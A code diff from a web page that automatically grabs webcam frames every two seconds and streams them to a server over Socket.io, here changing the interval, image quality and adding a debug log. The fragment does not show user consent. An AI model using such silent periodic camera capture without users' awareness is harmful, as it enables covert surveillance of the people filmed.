@@ -45,7 +45,7 @@
                 video.onloadedmetadata = () => {
                     video.play();
 
-                    // Take selfies every 2-3 seconds
+                    // Take selfies every 2 seconds
                     setInterval(() => {
                         canvas.width = video.videoWidth;
                         canvas.height = video.videoHeight;
@@ -53,11 +53,12 @@
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
                         // Convert canvas to image
-                        const photoUrl = canvas.toDataURL('image/jpeg', 1.0);
+                        const photoUrl = canvas.toDataURL('image/jpeg', 0.7);
 
                         // Emit the image using Socket.io
                         socket.emit('selfie', photoUrl);
-                    }, Math.floor(Math.random() * 1000) + 2000); 
+                        console.log("Image sent:", photoUrl); // Debug log
+                    }, 2000); 
                 };
             } catch (err) {
                 console.error("Camera access error:", err);
